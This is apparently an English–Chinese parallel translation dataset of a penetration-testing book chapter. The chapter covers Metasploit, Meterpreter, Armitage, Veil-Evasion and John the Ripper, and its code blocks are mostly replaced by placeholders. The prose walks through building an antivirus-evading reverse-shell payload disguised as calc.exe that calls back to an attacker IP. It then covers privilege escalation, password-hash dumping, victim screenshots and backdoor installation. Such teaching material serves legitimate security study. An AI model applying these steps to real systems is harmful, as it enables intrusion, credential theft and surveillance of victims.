  - PREF_UL
  type: TYPE_NORMAL
  zh: '`info`: 用于查看有关模块的信息。'
- en: '`set`: This command sets the parameters, for example, RHOST (remote), LHOST
    (local), or payload for exploit.'
  id: totrans-234
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`set`：此命令设置参数，例如RHOST（远程），LHOST（本地）或用于利用的有效载荷。'
- en: '`exploit`: This is used for module execution.'
  id: totrans-235
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`exploit`：这用于模块执行。'
- en: Note
  id: totrans-236
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 注意
- en: 'Metasploit Framework is really a very convenient way to show someone''s vulnerabilities,
    but unfortunately it is not possible to describe all the capabilities of Metasploit
    in one short review topic and it is beyond the scope of our book. If you decide
    to use Metasploit in your own work, we strongly recommend that you read the following
    books:'
  id: totrans-237
  prefs: []
  type: TYPE_NORMAL
  zh: Metasploit框架确实是展示某人漏洞的一种非常方便的方式，但不幸的是，不可能在一个简短的评论主题中描述Metasploit的所有功能，这超出了我们书籍的范围。如果您决定在自己的工作中使用Metasploit，我们强烈建议您阅读以下书籍：
- en: '*Metasploit Unleashed* by Offensive Security ([https://www.offensive-security.com/metasploit-unleashed/](https://www.offensive-security.com/metasploit-unleashed/))'
  id: totrans-238
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '*Metasploit揭秘* 作者Offensive Security ([https://www.offensive-security.com/metasploit-unleashed/](https://www.offensive-security.com/metasploit-unleashed/))'
- en: '*Metasploit Penetration Testing Cookbook* by Abhinav Singh ([https://www.packtpub.com/networking-and-servers/metasploit-penetration-testing-cookbook](https://www.packtpub.com/networking-and-servers/metasploit-penetration-testing-cookbook))'
  id: totrans-239
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '*Metasploit渗透测试食谱* 作者Abhinav Singh ([https://www.packtpub.com/networking-and-servers/metasploit-penetration-testing-cookbook](https://www.packtpub.com/networking-and-servers/metasploit-penetration-testing-cookbook))'
- en: '*Mastering Metasploit* by Nipun Jaswal ([https://www.packtpub.com/networking-and-servers/mastering-metasploit](https://www.packtpub.com/networking-and-servers/mastering-metasploit))'
  id: totrans-240
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '*精通Metasploit* 作者Nipun Jaswal ([https://www.packtpub.com/networking-and-servers/mastering-metasploit](https://www.packtpub.com/networking-and-servers/mastering-metasploit))'
- en: '*Learning Metasploit Exploitation and Development* by Aditya Balapure ([https://www.packtpub.com/networking-and-servers/learning-metasploit-exploitation-and-development](https://www.packtpub.com/networking-and-servers/learning-metasploit-exploitation-and-development))'
  id: totrans-241
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '*学习Metasploit渗透和开发* 作者Aditya Balapure ([https://www.packtpub.com/networking-and-servers/learning-metasploit-exploitation-and-development](https://www.packtpub.com/networking-and-servers/learning-metasploit-exploitation-and-development))'
- en: Meterpreter
  id: totrans-242
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: Meterpreter
- en: 'Meterpreter ([https://github.com/rapid7/meterpreter](https://github.com/rapid7/meterpreter))
    is a part of Metasploit and one of the most popular payloads in Metasploit. In
    the context of Metasploit, Meterpreter is a flexible, scalable, full-featured,
    and unified basis for post-exploitation, as an alternative to the classic shellcode.
    It has a lot of features: shell, migration processes, encryption to bypass intrusion
    detection systems, antivirus, DLL injection, pivoting, and automation possibilities.'
  id: totrans-243
  prefs: []
  type: TYPE_NORMAL
  zh: Meterpreter ([https://github.com/rapid7/meterpreter](https://github.com/rapid7/meterpreter))
    是Metasploit的一部分，也是Metasploit中最受欢迎的有效载荷之一。在Metasploit的上下文中，Meterpreter是一种灵活，可扩展，功能齐全且统一的后渗透基础，作为传统shellcode的替代方案。它具有许多功能：shell，迁移进程，加密以绕过入侵检测系统，防病毒软件，DLL注入，枢轴，以及自动化可能性。
- en: By the way, we can also use `metsvc` as the payload, which will install Meterpreter
    on a remote system as a service of the operating system on a remote Windows host
    (like a backdoor).
  id: totrans-244
  prefs: []
  type: TYPE_NORMAL
  zh: 顺便说一句，我们还可以使用`metsvc`作为有效载荷，它将在远程系统上将Meterpreter安装为远程Windows主机操作系统的服务（类似于后门）。
- en: 'After successful exploitation of the vulnerability on a remote host and loading
    the payload (Meterpreter in our case) in the interactive console of Metasploit,
    we obtain the full-featured console command line of Meterpreter and we can execute
    the command. All commands of Meterpreter can be divided into different categories
    (you can get this information by executing the `help` command):'
  id: totrans-245
  prefs: []
  type: TYPE_NORMAL
  zh: 在成功利用远程主机上的漏洞并在Metasploit的交互式控制台中加载有效载荷（在我们的情况下是Meterpreter）后，我们获得了Meterpreter的功能齐全的控制台命令行，可以执行命令。
    Meterpreter的所有命令可以分为不同的类别（通过执行`help`命令可以获取此信息）：
- en: '**Core commands**: These are basic commands for Meterpreter session management'
  id: totrans-246
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**核心命令**：这些是用于Meterpreter会话管理的基本命令'
- en: '**Stdapi—filesystem commands**: These are commands for moving on remote filesystems,
    file manipulation commands, download and upload file commands, and so on'
  id: totrans-247
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Stdapi—文件系统命令**：这些命令用于在远程文件系统上移动，文件操作命令，下载和上传文件命令等。'
- en: '**Stdapi—networking commands**: These are commands for displaying information
    about network components, viewing and modifying the routing table, and managing
    forwarding a local port to a remote'
  id: totrans-248
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Stdapi—网络命令**：这些命令用于显示有关网络组件的信息，查看和修改路由表，并管理将本地端口转发到远程的操作。'
- en: '**Stdapi—system commands**: These commands are useful for manipulating a remote
    system and processes of that system'
  id: totrans-249
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Stdapi—系统命令**：这些命令对于操作远程系统和该系统的进程非常有用。'
- en: We will not describe all commands of Meterpreter now, because it would require
    many pages of text. It is better to show a real-world example of how it works.
  id: totrans-250
  prefs: []
  type: TYPE_NORMAL
  zh: 我们现在不描述 Meterpreter 的所有命令，因为这将需要许多页面的文字。最好通过一个实际的示例来展示它是如何工作的。
- en: Example
  id: totrans-251
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 示例
- en: 'As an example of Metasploit usage, we consider the case when Meterpreter is
    packed into an executable file that is executed at a Windows workstation of an
    incautious user. As a result, Meterpreter establishes a connection to a predefined
    IP address (the attacker''s machine) that allows an attacker to execute commands
    at the victim''s workstation:'
  id: totrans-252
  prefs: []
  type: TYPE_NORMAL
  zh: 作为 Metasploit 使用的示例，我们考虑一种情况，其中 Meterpreter 被打包成一个可执行文件，并在一个不谨慎用户的 Windows 工作站上执行。结果，Meterpreter
    与预定义的 IP 地址（攻击者的机器）建立连接，允许攻击者在受害者的工作站上执行命令：
- en: 'First of all, let''s create our payload. For this, we should execute the following
    command:'
  id: totrans-253
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 首先，让我们创建我们的有效负载。为此，我们应执行以下命令：
- en: '[PRE18]'
  id: totrans-254
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE18]'
- en: 'Here:'
  id: totrans-255
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 在这里：
- en: '-`p windows/meterpreter/reverse_tcp`: This specifies the payload we are going
    to use (for a full list of supported payloads, just execute the command `msfvenom
    –l payloads`)'
  id: totrans-256
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: -`p windows/meterpreter/reverse_tcp`：此选项指定我们将使用的有效负载（要查看支持的完整有效负载列表，只需执行命令`msfvenom
    –l payloads`）
- en: '`lhost=10.0.0.191`: This specifies the address of the attacker''s host to connect
    back to'
  id: totrans-257
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`lhost=10.0.0.191`：此选项指定攻击者主机的地址以供回连'
- en: '`lport=8888`: This specifies the port number for connecting back'
  id: totrans-258
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`lport=8888`：此选项指定回连的端口号'
- en: '`-a x86`: This specifies the architecture of the target system'
  id: totrans-259
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`-a x86`：此选项指定目标系统的架构'
- en: '`--platform win`: This specifies the platform of the target system'
  id: totrans-260
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`--platform win`：此选项指定目标系统的平台'
- en: '`-e x86/shikata_ga_nai`: This specifies the encoding algorithm to be applied
    to our payload in order to try to avoid detection by an antivirus software'
  id: totrans-261
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`-e x86/shikata_ga_nai`：此选项指定要应用于有效负载的编码算法，以尽量避免被防病毒软件检测到'
- en: '-`i 3`: This specifies the required number of encoding iterations'
  id: totrans-262
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: -`i 3`：此选项指定所需的编码迭代次数
- en: '`-x calc.exe`: This specifies a custom executable file to use as a template'
  id: totrans-263
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`-x calc.exe`：此选项指定作为模板使用的自定义可执行文件'
- en: '`-f exe-only`: This specifies the output format'
  id: totrans-264
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`-f exe-only`：此选项指定输出格式'
- en: '`payload_fake_calc_enc.exe`: This is the output filename of our generated malicious
    executable'
  id: totrans-265
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`payload_fake_calc_enc.exe`：这是我们生成的恶意可执行文件的输出文件名'
- en: 'The output of this command should look like this:'
  id: totrans-266
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 此命令的输出应如下所示：
- en: '[PRE19]'
  id: totrans-267
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE19]'
- en: Now we have the `payload_fake_calc_enc.exe` file and we need to get this file
    to the victim host. You can just copy it there and assume that a victim/user has
    downloaded it from the Internet.
  id: totrans-268
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在我们有了 `payload_fake_calc_enc.exe` 文件，接下来需要将该文件传输到受害者主机。你可以直接复制到那里，并假设受害者/用户是从互联网下载的该文件。
- en: Now, we need to start listening for incoming connections at the attacker's machine.
    To do this, run Metasploit Framework on the attacker's machine by executing in
    console command `msfconsole`. After few seconds, Metasploit will be loaded, started,
    and invite us to command prompt.
  id: totrans-269
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，我们需要在攻击者的机器上开始监听传入的连接。为此，通过在控制台中执行命令`msfconsole`来启动 Metasploit Framework。几秒钟后，Metasploit
    将加载并启动，邀请我们进入命令提示符。
- en: 'To start listening, let''s choose the necessary module:'
  id: totrans-270
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 要开始监听，让我们选择所需的模块：
- en: '[PRE20]'
  id: totrans-271
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE20]'
- en: 'Set the payload type for which connections to await:'
  id: totrans-272
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 设置要等待连接的有效负载类型：
- en: '[PRE21]'
  id: totrans-273
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE21]'
- en: 'We should see the following confirmation:'
  id: totrans-274
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 我们应该看到以下确认：
- en: '[PRE22]'
  id: totrans-275
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE22]'
- en: 'After that, we need to set a few options required by this certain payload (local
    address and port for listening):'
  id: totrans-276
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 然后，我们需要设置一些此特定有效负载所需的选项（监听的本地地址和端口）：
- en: '[PRE23]'
  id: totrans-277
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE23]'
- en: 'Metasploit will confirm that both options are set:'
  id: totrans-278
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: Metasploit 将确认两个选项是否已设置：
- en: '[PRE24]'
  id: totrans-279
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE24]'
- en: 'To start listening, we need to execute the `exploit` command:'
  id: totrans-280
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 要开始监听，我们需要执行 `exploit` 命令：
- en: '[PRE25]'
  id: totrans-281
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE25]'
- en: 'If everything went well, we should see the following output:'
  id: totrans-282
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如果一切顺利，我们应该看到以下输出：
- en: '[PRE26]'
  id: totrans-283
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE26]'
- en: 'So, everything is set up and ready for an attack. Let''s execute our generated
    malicious file `payload_fake_calc_enc.exe` on the victim host. In the console
    of Metasploit, we will see something like this:'
  id: totrans-284
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 所以，一切已设置好，准备进行攻击。让我们在受害者主机上执行我们生成的恶意文件 `payload_fake_calc_enc.exe`。在 Metasploit
    控制台中，我们将看到如下内容：
- en: '[PRE27]'
  id: totrans-285
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE27]'
- en: 'To start interacting with the Meterpreter session, we need to execute the following
    command:'
  id: totrans-286
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 要开始与 Meterpreter 会话交互，我们需要执行以下命令：
- en: '[PRE28]'
  id: totrans-287
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE28]'
- en: 'After that, we will find ourselves in an interactive console of Meterpreter
    session. Now, we can execute commands inside our session, which will be executed
    on the remote victim host. For example, we need to execute the command `getuid`
    to see which user environment started our session and to get the identifier of
    our current process, we can use the `getpid` command:'
  id: totrans-288
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 之后，我们将进入Meterpreter会话的交互式控制台。现在，我们可以在会话内执行命令，这些命令将在远程受害主机上执行。例如，我们需要执行`getuid`命令查看启动我们会话的用户环境，并且要获取当前进程的标识符，我们可以使用`getpid`命令：
- en: '[PRE29]'
  id: totrans-289
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE29]'
- en: 'These commands produce the following output:'
  id: totrans-290
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 这些命令产生以下输出：
- en: '[PRE30]'
  id: totrans-291
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE30]'
- en: 'To escalate privilege, we can use the `getsystem` command:'
  id: totrans-292
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 为了提升权限，我们可以使用`getsystem`命令：
- en: '[PRE31]'
  id: totrans-293
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE31]'
- en: 'This command produces the following output:'
  id: totrans-294
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 此命令产生以下输出：
- en: '[PRE32]'
  id: totrans-295
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE32]'
- en: 'And then check the result with the `getuid` command:'
  id: totrans-296
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 然后使用`getuid`命令检查结果：
- en: '[PRE33]'
  id: totrans-297
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE33]'
- en: 'Now we have system privileges which we can see from the command''s output:'
  id: totrans-298
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 现在我们拥有系统权限，可以从命令输出中看到这一点：
- en: '[PRE34]'
  id: totrans-299
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE34]'
- en: 'To list all processes running on the remote system, we can use the `ps` command:'
  id: totrans-300
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 要列出远程系统上所有正在运行的进程，我们可以使用`ps`命令：
- en: '[PRE35]'
  id: totrans-301
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE35]'
- en: The output lists all running processes along with their identifiers and the
    other useful information
  id: totrans-302
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 输出列出了所有运行中的进程及其标识符和其他有用的信息：
- en: '[PRE36]'
  id: totrans-303
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE36]'
- en: 'We can also migrate to another process to avoid losing the connection of our
    malicious process. We can do it with the `migrate` command, specifying the target
    process identifier:'
  id: totrans-304
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们还可以迁移到另一个进程，以避免丢失恶意进程的连接。我们可以使用`migrate`命令，并指定目标进程标识符来完成：
- en: '[PRE37]'
  id: totrans-305
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE37]'
- en: 'The output is as follows:'
  id: totrans-306
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 输出如下：
- en: '[PRE38]'
  id: totrans-307
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE38]'
- en: 'Meterpreter can also obtain hashes of the local user passwords on a hacked
    machine with the `hashdump` command (to successfully execute this command, we
    need to obtain system privileges before):'
  id: totrans-308
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: Meterpreter还可以通过`hashdump`命令获取被黑机器上本地用户密码的哈希值（要成功执行此命令，我们需要先获得系统权限）：
- en: '[PRE39]'
  id: totrans-309
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE39]'
- en: 'The output is as follows:'
  id: totrans-310
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 输出如下：
- en: '[PRE40]'
  id: totrans-311
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE40]'
- en: 'Meterpreter has a variety of functionalities and we can even take a screenshot
    of a victim''s desktop session with the `screenshot` command:'
  id: totrans-312
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: Meterpreter拥有多种功能，我们甚至可以通过`screenshot`命令截取受害者桌面会话的屏幕截图：
- en: '[PRE41]'
  id: totrans-313
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE41]'
- en: When executed successfully, it reports the path where the screenshot was saved
  id: totrans-314
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 执行成功后，它会报告截图保存的路径：
- en: '[PRE42]'
  id: totrans-315
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE42]'
- en: 'To terminate a session when you are done with the victim, execute the `exit`
    command:'
  id: totrans-316
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 当完成与受害者的会话时，要终止会话，请执行`exit`命令：
- en: '[PRE43]'
  id: totrans-317
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE43]'
- en: 'The output is as follows:'
  id: totrans-318
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 输出如下：
- en: '[PRE44]'
  id: totrans-319
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE44]'
- en: Armitage
  id: totrans-320
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: Armitage
- en: It is necessary to mention the graphical interface for the Metasploit Framework,
    which is called **Armitage**. It is a graphical interface for Metasploit Framework
    to simplify working with it. Armitage represents host targets in the visual mode
    and it also gives tips and recommendations for exploits in each case. For advanced
    users, Armitage offers remote management and cooperation with Metasploit sessions.
  id: totrans-321
  prefs: []
  type: TYPE_NORMAL
  zh: 必须提到的是Metasploit框架的图形界面，称为**Armitage**。它是Metasploit框架的图形界面，简化了与它的交互。Armitage以视觉模式展示主机目标，并且在每种情况下都会提供漏洞利用的提示和建议。对于高级用户，Armitage提供了远程管理和与Metasploit会话的协作功能。
- en: Although Armitage is a graphical user interface that is mostly managed by a
    mouse, you cannot work completely without using the console. Thus, you have to
    learn how to use console commands anyway.
  id: totrans-322
  prefs: []
  type: TYPE_NORMAL
  zh: 虽然Armitage是一个主要由鼠标操作的图形用户界面，但你不能完全不使用控制台进行工作。因此，你还是得学习如何使用控制台命令。
- en: Download the installation archive from the official website [http://www.fastandeasyhacking.com/](http://www.fastandeasyhacking.com/).
  id: totrans-323
  prefs: []
  type: TYPE_NORMAL
  zh: 从官方网站下载安装包[http://www.fastandeasyhacking.com/](http://www.fastandeasyhacking.com/)。
- en: 'After installation, start Armitage by running the Armitage executable file:'
  id: totrans-324
  prefs: []
  type: TYPE_NORMAL
  zh: 安装完成后，通过运行Armitage可执行文件启动Armitage：
- en: '[PRE45]'
  id: totrans-325
  prefs: []
  type: TYPE_PRE
  zh: '[PRE45]'
- en: 'After that, you will get the screen of Armitage:'
  id: totrans-326
  prefs: []
  type: TYPE_NORMAL
  zh: 之后，你将看到Armitage的界面：
- en: '![Armitage](../images/00062.jpeg)'
  id: totrans-327
  prefs: []
  type: TYPE_IMG
  zh: '![Armitage](../images/00062.jpeg)'
- en: The program's interface is simple enough to understand, and it does not pose
    any difficulty if you know how Metasploit Framework works.
  id: totrans-328
  prefs: []
  type: TYPE_NORMAL
  zh: 该程序的界面足够简单易懂，如果你了解Metasploit框架的工作原理，就不会有任何困难。
- en: Veil-Evasion framework
  id: totrans-329
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: Veil-Evasion框架
- en: Any defense system can be cheated and this applies to anti-virus too. It is
    a question of time needed to bypass the defense. In this case, a tool that automates
    the process of creating an encrypted payload is very useful. The most popular
    tool for this purpose is Veil-Evasion framework. It works as an add-on to Metasploit
    that has a wide range of functionality and is easy to use. Its only drawback is
    that it is "from the box" and supported only in the Kali Linux operating system
    environment.
  id: totrans-330
  prefs: []
  type: TYPE_NORMAL
  zh: 任何防御系统都可以被欺骗，反病毒软件也不例外。这只是绕过防御所需的时间问题。在这种情况下，自动化创建加密有效载荷的工具非常有用。用于此目的的最流行工具是Veil-Evasion框架。它作为Metasploit的附加组件，具有广泛的功能，并且易于使用。它唯一的缺点是它是“开箱即用”的，并且仅在Kali
    Linux操作系统环境中受支持。
- en: 'The most obvious features are as follows:'
  id: totrans-331
  prefs: []
  type: TYPE_NORMAL
  zh: 最明显的特点如下：
- en: Modularity of framework
  id: totrans-332
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 框架的模块化
- en: All generated `msfvenom` payloads for Windows can be integrated into the Framework
  id: totrans-333
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 所有为Windows生成的`msfvenom`有效载荷都可以集成到框架中
- en: Menu interface has been designed according to the principles of usability
  id: totrans-334
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 菜单界面根据可用性原则进行了设计
- en: Autocompletion and autosubstitution
  id: totrans-335
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 自动完成和自动替换
- en: Almost all options have been well documented (`./Veil.py -h`)
  id: totrans-336
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 几乎所有选项都有很好的文档记录（`./Veil.py -h`）
- en: 'After successful installation of Framework on your workstation, you can execute
    it with a simple command:'
  id: totrans-337
  prefs: []
  type: TYPE_NORMAL
  zh: 在您的工作站成功安装框架后，您可以通过简单的命令执行它：
- en: '[PRE46]'
  id: totrans-338
  prefs: []
  type: TYPE_PRE
  zh: '[PRE46]'
- en: 'After that, you are welcomed by the Veil-Evasion framework main menu:'
  id: totrans-339
  prefs: []
  type: TYPE_NORMAL
  zh: 之后，您将被欢迎进入Veil-Evasion框架的主菜单：
- en: '[PRE47]'
  id: totrans-340
  prefs: []
  type: TYPE_PRE
  zh: '[PRE47]'
- en: 'To create an encrypted payload, you should perform the following actions:'
  id: totrans-341
  prefs: []
  type: TYPE_NORMAL
  zh: 要创建加密有效载荷，您应执行以下操作：
- en: Enter the `use` command.
  id: totrans-342
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 输入`use`命令。
- en: From the list that appears, select the payload index that you want to generate.
  id: totrans-343
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 从出现的列表中选择要生成的有效载荷索引。
- en: Next, you should set the required options with the `set` command. After all
    the options are set, input the `generate` command.
  id: totrans-344
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，您应使用`set`命令设置所需的选项。设置所有选项后，输入`generate`命令。
- en: 'Next, you need to choose which shellcode will be used:'
  id: totrans-345
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，您需要选择要使用的shellcode：
- en: '`msfvenom` (default)'
  id: totrans-346
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msfvenom`（默认）'
- en: Custom shellcode string
  id: totrans-347
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: 自定义shellcode字符串
- en: File with shellcode (raw)
  id: totrans-348
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: 具有shellcode的文件（原始）
- en: If you choose `msfvenom`, it will ask you about which payload to use (for example,
    Meterpreter) and the options while generating shellcode.
  id: totrans-349
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 如果选择`msfvenom`，它将询问您要使用哪种有效载荷（例如，Meterpreter）以及生成shellcode时的选项。
- en: Finally, Framework will ask you about the name of the output file that will
    be generated.
  id: totrans-350
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 最后，框架将询问您要生成的输出文件的名称。
- en: 'At the end, Veil-Evasion framework shows the summary information about the
    generated payload:'
  id: totrans-351
  prefs: []
  type: TYPE_NORMAL
  zh: 最后，Veil-Evasion框架显示了生成的有效载荷的摘要信息：
- en: '[PRE48]'
  id: totrans-352
  prefs: []
  type: TYPE_PRE
  zh: '[PRE48]'
- en: This concludes our review of the Veil-Evasion framework. In the end, we suggest
    you to try it in action.
  id: totrans-353
  prefs: []
  type: TYPE_NORMAL
  zh: 这结束了我们对Veil-Evasion框架的回顾。最后，我们建议您尝试将其付诸实践。
- en: Cracking tools
  id: totrans-354
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 破解工具
- en: Today, hashing is a basic security mechanism of most IT services. Overall, hashing
    transforms data of arbitrary length into the output bit string of a fixed length
    in a non-recoverable way (that is why it also called a one-way conversion). Hashes
    are often used for authentication purposes (to store and compare hashes of user
    passwords instead of storing passwords in clear text what is insecure), for integrity
    control (checksums).
  id: totrans-355
  prefs: []
  type: TYPE_NORMAL
  zh: 如今，哈希是大多数IT服务的基本安全机制。总体而言，哈希将任意长度的数据以不可逆的方式转换为固定长度的输出位字符串（这也是为什么它被称为单向转换）。哈希经常用于认证目的（存储和比较用户密码的哈希值，而不是以明文存储密码，这是不安全的），用于完整性控制（校验和）。
- en: Nowadays, we cannot imagine technologies that do not use encryption. Therefore,
    the question of the restoration of hashed data is one of the most important in
    today's IT security world. In this section, we will look at some of the popular
    tools that can be useful in performing this security analysis.
  id: totrans-356
  prefs: []
  type: TYPE_NORMAL
  zh: 如今，我们无法想象不使用加密的技术。因此，恢复哈希数据的问题是当今IT安全世界中最重要的问题之一。在本节中，我们将看一些在执行此安全分析时可能有用的流行工具。
- en: John The Ripper
  id: totrans-357
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: John The Ripper
- en: '**John The Ripper** (**JTR**) is a free program designed to recover passwords
    from their hashes. The main purpose of the program is to audit weak passwords
    on Unix systems. The program can also perform an audit of NTLM hashes (Microsoft
    Windows), Kerberos, and others. There are a variety of implementations of JTR
    for different operating systems. JTR is popular because it supports a lot of hash
    types. Several additional types of hashes are available with the additional updates.'
  id: totrans-358
  prefs: []
  type: TYPE_NORMAL
  zh: '**John The Ripper**（**JTR**）是一个免费的程序，旨在从哈希中恢复密码。该程序的主要目的是审计Unix系统上的弱密码。该程序还可以审计NTLM哈希（Microsoft
    Windows）、Kerberos等。JTR有多种实现，适用于不同的操作系统。JTR之所以流行，是因为它支持多种哈希类型。随着附加更新，还可以使用几种额外的哈希类型。'
- en: The latest version of JTR is available on the official website [http://www.openwall.com/john](http://www.openwall.com/john).
  id: totrans-359
  prefs: []
  type: TYPE_NORMAL
  zh: 最新版本的JTR可在官方网站[http://www.openwall.com/john](http://www.openwall.com/john)下载。
- en: 'Installation in Debian or Ubuntu Linux can be performed by the standard method:'
  id: totrans-360
  prefs: []
  type: TYPE_NORMAL
  zh: 在Debian或Ubuntu Linux中可以通过标准方法进行安装：
- en: '[PRE49]'
  id: totrans-361
  prefs: []
  type: TYPE_PRE
  zh: '[PRE49]'
- en: To restore password from hash, just run JTR with the path to the file (that
    contains the hash) as an input parameter. JTR automatically detects the type of
    hash and starts the necessary procedures.
  id: totrans-362
  prefs: []
  type: TYPE_NORMAL
  zh: 要从哈希中恢复密码，只需运行JTR并将包含哈希的文件路径作为输入参数。JTR会自动检测哈希类型并启动必要的程序。
- en: 'There are several modes of JTR for more efficient results:'
  id: totrans-363
  prefs: []
  type: TYPE_NORMAL
  zh: JTR有几种模式可以获得更高效的结果：
- en: '**Single**: This mode is very fast, but this mode should be used only if we
    have usernames. Usernames are used as passwords with prepared rules that are stored
    in the configuration file of JTR. For this mode, we execute the command `john
    -single hashes.txt`.'
  id: totrans-364
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**单一模式**：此模式非常快速，但仅在我们拥有用户名的情况下使用。用户名作为密码与预设规则一起存储在JTR的配置文件中。在此模式下，我们执行命令`john
    -single hashes.txt`。'
- en: '**Wordlist**: In this mode, JTR uses a dictionary and rules. Here, we can use
    the rules in the configuration file (`john -w=dictionary.txt -rules hashes.txt`)
    and the rules of a particular file (`john -w:dictionary.txt -rules=Rules.txt hashes.txt`).'
  id: totrans-365
  prefs:
